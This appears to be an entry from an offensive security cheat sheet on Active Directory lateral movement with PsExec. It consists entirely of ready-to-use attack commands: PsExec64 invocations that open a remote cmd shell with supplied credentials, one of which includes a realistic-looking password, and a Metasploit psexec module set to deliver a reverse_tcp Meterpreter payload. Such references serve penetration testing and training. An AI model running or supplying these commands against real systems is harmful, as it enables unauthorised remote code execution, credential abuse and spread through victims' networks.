---
title: PsExec - Remote Command Execution
category: ad
subcategory: ad-lateral
os: windows, linux
command: PsExec64.exe \\target -u domain\user -p pass cmd
tools: PsExec64, msfconsole
---


### Drop and run on the target

```cmd
PsExec64.exe -i \\KOMPUTER -u DOMENA\USER -p HASLO cmd
PsExec64.exe -i \\BACKUP-SRV -u firma\marek -p Trudne$Haslo99 cmd
```

### Metasploit psexec

```
use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_tcp
exploit
```
